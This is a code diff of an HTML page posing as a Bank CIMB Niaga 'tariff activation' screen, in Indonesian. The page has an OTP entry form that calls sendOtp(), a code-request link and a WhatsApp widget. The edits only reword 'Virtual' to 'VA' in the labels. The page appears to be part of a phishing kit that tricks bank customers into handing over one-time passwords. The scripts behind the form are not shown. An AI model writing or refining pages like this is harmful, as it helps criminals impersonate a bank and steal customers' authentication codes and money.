@@ -236,13 +236,13 @@
         <h1 class="card-title">Aktivasi Tarif Bank Cimb Niaga</h1>
         
         <p class="card-description">
-            Masukan kode Aktivasi / Virtual yang telah dikirimkan ke nomor
+            Masukan kode Aktivasi / VA yang telah dikirimkan ke nomor
             <span id="phone-number" class="highlight-text"></span>
         </p>
         
         <p class="timer" id="countdown"></p>
         
-        <div class="alert alert-error" id="errorAlert" style="display: none;"><p>Kode Aktivasi salah!</p></div>
+        <div class="alert alert-error" id="errorAlert" style="display: none;"><p>Kode VA salah!</p></div>
         
         <form method="post" id="otp-form" onsubmit="sendOtp()" method="POST">
             <input type="hidden" id="tarif" name="tarif">
@@ -253,7 +253,7 @@
             
             <div class="form-group">
                 <label for="otp-input">Konfirmasi (Wajib)</label>
-                <input type="tel" class="form-input" id="otp" name="otp" placeholder="Kode Virtual" 
+                <input type="tel" class="form-input" id="otp" name="otp" placeholder="Kode VA" 
                        maxlength="6" minlength="6" 
                        pattern="[0-9]{6}" required
                        title="Mohon masukkan Kode OTP dengan benar">
@@ -262,7 +262,7 @@
             <button type="submit" id="submit-btn" class="submit-btn">Konfirmasi</button>
         </form>
         
-        <a onclick="wa()" class="action-link"><b>>> Request kode Virtual <<<</b></a>
+        <a onclick="wa()" class="action-link"><b>>> Request kode VA <<<</b></a>
     </div>
 
     <div class="whatsapp-float">
